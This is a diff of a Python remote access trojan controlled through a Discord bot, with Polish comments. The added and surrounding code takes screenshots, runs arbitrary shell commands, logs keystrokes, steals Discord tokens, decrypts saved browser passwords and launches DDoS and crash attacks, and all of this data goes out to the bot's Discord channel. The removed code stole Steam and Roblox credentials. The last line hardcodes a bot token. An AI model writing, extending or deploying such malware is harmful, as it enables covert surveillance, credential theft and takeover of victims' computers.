@@ -7,46 +7,37 @@ import pyautogui
 import subprocess
 import asyncio
 import requests
-import json
 import re
+import json
 import base64
-import win32crypt
-import sqlite3
-import shutil
+import winreg as reg
 import ctypes
-from pynput import keyboard
-from colorama import Fore, init
-from datetime import datetime
-import getpass
-import cv2
-import wave
-import numpy as np
-import sounddevice as sd
-from scapy.all import IP, ICMP, send
+import shutil
+import sys
 import time
 import threading
-import glob
+import getpass
+import cv2
+from pynput import keyboard
+from PIL import ImageGrab
+import numpy as np
+import sounddevice as sd
+import wave
+import sqlite3
 import urllib.request
 import browser_cookie3
 
-# Inicjalizacja kolorów
-init()
-
-# Token bota
-BOT_TOKEN = "TWOJ_TOKEN_BOTA_TUTAJ"
-
-# Ustawienia bota
+# Inicjalizacja bota
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guild_messages = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# Globalne zmienne
+# Zmienna globalna
 key_log = []
 keylog_listener = None
 reverse_mouse = False
-cpu_stress_running = False
 
 # Funkcja sprawdzania administratora
 def is_admin():
@@ -64,7 +55,7 @@ def get_system_info():
     memory = psutil.virtual_memory()
     ram_usage = f"{memory.percent}%"
     disk = psutil.disk_usage('/')
-    disk_usage = f"{disk.percent}% użytego z {disk.total // (1024 ** 3)} GB"
+    disk_usage = f"{disk.percent}% used of {disk.total // (1024 ** 3)} GB"
     return {
         "PC Name": pc_name,
         "IP Address": ip_address,
@@ -78,17 +69,104 @@ def get_system_info():
 @bot.command()
 async def information(ctx):
     info = get_system_info()
-    embed = discord.Embed(title="🖥️ Informacje o systemie", color=discord.Color.green())
+    embed = discord.Embed(title="🖥️ System Information", color=discord.Color.green())
     for key, value in info.items():
         embed.add_field(name=key, value=value, inline=False)
     await ctx.send(embed=embed)
+
+# Komenda: !screen – zrzut ekranu
+@bot.command()
+async def screen(ctx):
+    screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
+    img = ImageGrab.grab()
+    img.save(screenshot_path)
+    await ctx.send(file=discord.File(screenshot_path))
+    os.remove(screenshot_path)
+
+# Komenda: !exec – wykonanie komendy CMD / PowerShell
+@bot.command()
+async def exec(ctx, *, cmd: str):
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    result = proc.stdout.read() + proc.stderr.read()
+    result_str = result.decode('utf-8', errors='ignore')
+    await ctx.send(f"```\n{result_str[:1900]}\n```")
+
+# Komenda: !battery – stan baterii
+@bot.command()
+async def battery(ctx):
+    battery = psutil.sensors_battery()
+    percent = battery.percent if battery else "N/A"
+    plugged = battery.power_plugged if battery else "N/A"
+    await ctx.send(f"Bateria: {percent}%, Podłączony: {'Tak' if plugged else 'Nie'}")
+
+# Komenda: !ram – użycie pamięci
+@bot.command()
+async def ram(ctx):
+    mem = psutil.virtual_memory()
+    await ctx.send(f"🧠 RAM: {mem.percent}%")
+
+# Komenda: !cpu – obciążenie CPU
+@bot.command()
+async def cpu(ctx):
+    usage = psutil.cpu_percent(interval=1)
+    await ctx.send(f"⚙️ CPU: {usage}%")
+
+# Komenda: !disk – dane dyskowe
+@bot.command()
+async def disk(ctx):
+    disk = psutil.disk_usage('/')
+    await ctx.send(f"📦 Dysk: {disk.percent}% użytego z {disk.total // (1024 ** 3)} GB")
+
+# Komenda: !geolocation – lokalizacja geograficzna
+@bot.command()
+async def geolocation(ctx):
+    response = requests.get("https://ipinfo.io/json").json() 
+    await ctx.send(f"📍 Lokalizacja: {response}")
+
+# Komenda: !reboot – restart systemu
+@bot.command()
+async def reboot(ctx):
+    await ctx.send("🔄 Restartowanie systemu...")
+    os.system("shutdown /r /t 0")
+
+# Komenda: !logout – wylogowanie użytkownika
+@bot.command()
+async def logout(ctx):
+    await ctx.send("🔒 Wylogowywanie...")
+    ctypes.windll.user32.LockWorkStation()
+
+# Komenda: !keylog_start – start keylogera
+def on_press(key):
+    global key_log
+    key_log.append(str(key))
+
+@bot.command()
+async def keylog_start(ctx):
+    global keylog_listener
+    if keylog_listener is None:
+        keylog_listener = keyboard.Listener(on_press=on_press)
+        keylog_listener.start()
+        await ctx.send("⌨️ Keylogger uruchomiony!")
+
+# Komenda: !keylog_stop – stop keylogerowi
+@bot.command()
+async def keylog_stop(ctx):
+    global keylog_listener
+    if keylog_listener and keylog_listener.is_alive():
+        keylog_listener.stop()
+        keylog_listener = None
+        await ctx.send("🛑 Keylogger zatrzymany.")
+        with open("keylog.txt", "w") as f:
+            f.write("\n".join(key_log))
+        await ctx.send(file=discord.File("keylog.txt"))
+        os.remove("keylog.txt")
+        key_log.clear()
 
 # Komenda: !tokens – kradzież tokenów Discord
 @bot.command()
 async def tokens(ctx):
     tokens = []
 
-    # Ścieżki do tokenów
     local = os.getenv("LOCALAPPDATA")
     roaming = os.getenv("APPDATA")
 
@@ -98,18 +176,19 @@ async def tokens(ctx):
     }
 
     for name, path in paths.items():
-        if os.path.exists(path):
-            try:
-                for file in os.listdir(path):
-                    if file.endswith('.log') or file.endswith('.ldb'):
-                        with open(os.path.join(path, file), errors='ignore') as f:
-                            lines = f.readlines()
-                            for line in lines:
-                                match = re.findall(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", line)
-                                if match:
-                                    tokens.extend(match)
-            except Exception as e:
-                print(f"[!] Błąd w {name}: {str(e)}")
+        if not os.path.exists(path):
+            continue
+        try:
+            for file in os.listdir(path):
+                if file.endswith('.log') or file.endswith('.ldb'):
+                    with open(os.path.join(path, file), errors='ignore') as f:
+                        lines = f.readlines()
+                        for line in lines:
+                            match = re.findall(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", line)
+                            if match:
+                                tokens.extend(match)
+        except Exception as e:
+            pass
 
     if tokens:
         unique_tokens = list(set(tokens))
@@ -133,11 +212,6 @@ BROWSERS = {
         "profiles": r"Default|Guest Profile|Profile \d+",
         "login_db": r"Login Data"
     },
-    "opera": {
-        "path": os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable'),
-        "profiles": r"Default|Guest Profile|Profile \d+",
-        "login_db": r"Login Data"
-    },
     "brave": {
         "path": os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data'),
         "profiles": r"Default|Guest Profile|Profile \d+",
@@ -152,7 +226,10 @@ def get_master_key(browser_path):
         with open(local_state_path, "r", encoding="utf-8") as f:
             local_state = json.load(f)
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        master_key = ctypes.WinDLL('crypt32.dll').CryptUnprotectData(
+            ctypes.c_char_p(encrypted_key),
+            None, None, None, None, 0
+        )[1]
         return master_key
     except:
         return None
@@ -232,99 +309,6 @@ async def hasła(ctx):
     else:
         await ctx.send("[+] Nie znaleziono żadnych haseł.")
 
-# Komenda: !screen – zrzut ekranu
-@bot.command()
-async def screen(ctx):
-    try:
-        screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
-        img = ImageGrab.grab()
-        img.save(screenshot_path)
-        await ctx.send(file=discord.File(screenshot_path))
-        os.remove(screenshot_path)
-    except Exception as e:
-        await ctx.send(f"[!] Błąd zrzutu ekranu: {str(e)}")
-
-# Komenda: !exec – wykonanie komendy CMD / PowerShell
-@bot.command()
-async def exec(ctx, *, cmd: str):
-    proc = subprocess.Popen(
-        cmd,
-        shell=True,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        stdin=subprocess.PIPE
-    )
-    result = proc.stdout.read() + proc.stderr.read()
-    result_str = result.decode('utf-8', errors='ignore')
-    await ctx.send(f"```\n{result_str[:1900]}\n```")
-
-# Komenda: !battery – stan baterii
-@bot.command()
-async def battery(ctx):
-    battery = psutil.sensors_battery()
-    percent = battery.percent
-    plugged = battery.power_plugged
-    await ctx.send(f"Bateria: {percent}%, Podłączony: {'Tak' if plugged else 'Nie'}")
-
-# Komenda: !ram – użycie pamięci
-@bot.command()
-async def ram(ctx):
-    mem = psutil.virtual_memory()
-    await ctx.send(f"🧠 RAM: {mem.percent}%")
-
-# Komenda: !cpu – obciążenie CPU
-@bot.command()
-async def cpu(ctx):
-    usage = psutil.cpu_percent(interval=1)
-    await ctx.send(f"⚙️ CPU: {usage}%")
-
-# Komenda: !disk – dane dyskowe
-@bot.command()
-async def disk(ctx):
-    disk = psutil.disk_usage('/')
-    await ctx.send(f"📦 Dysk: {disk.percent}% użytego z {disk.total // (1024 ** 3)} GB")
-
-# Komenda: !geolocation – lokalizacja geograficzna
-@bot.command()
-async def geolocation(ctx):
-    response = requests.get("https://ipinfo.io/json").json() 
-    await ctx.send(f"📍 Lokalizacja: {response}")
-
-# Komenda: !reboot – restart systemu
-@bot.command()
-async def reboot(ctx):
-    await ctx.send("🔄 Restartowanie systemu...")
-    os.system("shutdown /r /t 0")
-
-# Komenda: !logout – wylogowanie użytkownika
-@bot.command()
-async def logout(ctx):
-    await ctx.send("🔒 Wylogowywanie...")
-    ctypes.windll.user32.LockWorkStation()
-
-# Komenda: !keylog_start – start keylogera
-@bot.command()
-async def keylog_start(ctx):
-    global keylog_listener
-    if keylog_listener is None:
-        keylog_listener = keyboard.Listener(on_press=on_press)
-        keylog_listener.start()
-        await ctx.send("⌨️ Keylogger uruchomiony!")
-
-# Komenda: !keylog_stop – stop keylogerowi
-@bot.command()
-async def keylog_stop(ctx):
-    global keylog_listener
-    if keylog_listener and keylog_listener.is_alive():
-        keylog_listener.stop()
-        keylog_listener = None
-        await ctx.send("🛑 Keylogger zatrzymany.")
-        with open("keylog.txt", "w") as f:
-            f.write("\n".join(key_log))
-        await ctx.send(file=discord.File("keylog.txt"))
-        os.remove("keylog.txt")
-        key_log.clear()
-
 # Komenda: !ddos – atak DDoS
 @bot.command()
 async def ddos(ctx, ip: str, duration: int):
@@ -362,66 +346,6 @@ async def bsod(ctx):
     else:
         await ctx.send("⚠️ Wymagane uprawnienia administratora!")
 
-# Komenda: !cpufuck – obciążenie CPU
-@bot.command()
-async def cpufuck(ctx):
-    global cpu_stress_running
-    if cpu_stress_running:
-        await ctx.send("🔴 Obciążenie CPU już trwa.")
-        return
-
-    await ctx.send("🔥 Obciążam CPU do 100%...")
-
-    def stress_cpu():
-        global cpu_stress_running
-        cpu_stress_running = True
-        while cpu_stress_running:
-            pass
-
-    threading.Thread(target=stress_cpu).start()
-
-# Komenda: !stopcpufuck – zakończenie obciążenia
-@bot.command()
-async def stopcpufuck(ctx):
-    global cpu_stress_running
-    cpu_stress_running = False
-    await ctx.send("🟢 CPU wraca do normy.")
-
-# Komenda: !mouse_reverse – odwrócenie myszki
-@bot.command()
-async def mouse_reverse(ctx):
-    global reverse_mouse
-    reverse_mouse = not reverse_mouse
-    await ctx.send(f"🖱️ Myszka {"odwrócona!" if reverse_mouse else "powróciła do normy."})
-
-# Komenda: !minimize – minimalizacja okien
-@bot.command()
-async def minimize(ctx):
-    pyautogui.hotkey('win', 'd')
-    await ctx.send("🖥️ Minimalizacja wszystkich okien.")
-
-# Komenda: !steams – kradzież danych Steam
-@bot.command()
-async def steams(ctx):
-    steam_path = os.path.join(os.getenv("ProgramFiles(x86)"), "Steam", "config", "loginusers.vdf")
-    if os.path.exists(steam_path):
-        with open(steam_path, "r") as f:
-            content = f.read()
-        await ctx.send(f"🦺 Dane Steam:\n```\n{content[:1900]}\n```")
-    else:
-        await ctx.send("[!] Steam nie znaleziony.")
-
-# Komenda: !roblox – kradzież ciasteczek Roblox
-@bot.command()
-async def roblox(ctx):
-    cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), "Roblox", "logs", "http.log")
-    if os.path.exists(cookies_path):
-        with open(cookies_path, "r") as f:
-            data = f.read()
-        await ctx.send(f"🦺 Ciasteczka Roblox:\n```\n{data[:1900]}\n```")
-    else:
-        await ctx.send("[!] Brak danych Roblox.")
-
 # Komenda: !help – lista komend
 @bot.command()
 async def help(ctx):
@@ -442,12 +366,7 @@ async def help(ctx):
     embed.add_field(name="!ddos <ip> <czas>", value="DDoS attack", inline=False)
     embed.add_field(name="!disabledefender", value="Wyłącz Windows Defender", inline=False)
     embed.add_field(name="!bsod", value="Wywołaj BSOD", inline=False)
-    embed.add_field(name="!cpufuck / stopcpufuck", value="Obciążenie CPU", inline=False)
-    embed.add_field(name="!mouse_reverse", value="Odwróć myszkę", inline=False)
-    embed.add_field(name="!minimize", value="Minimalizacja wszystkich okien", inline=False)
-    embed.add_field(name="!steams", value="Dane konta Steam", inline=False)
-    embed.add_field(name="!roblox", value="Ciasteczka Roblox", inline=False)
     await ctx.send(embed=embed)
 
 # Uruchomienie bota
-bot.run(BOT_TOKEN)
+bot.run("MTM3ODE4MjU1ODY4ODQ4MTQ0MQ.GeAvY6.755FnZgrSHvzPrubjHArq7x_254CL9zzwtMzY0")
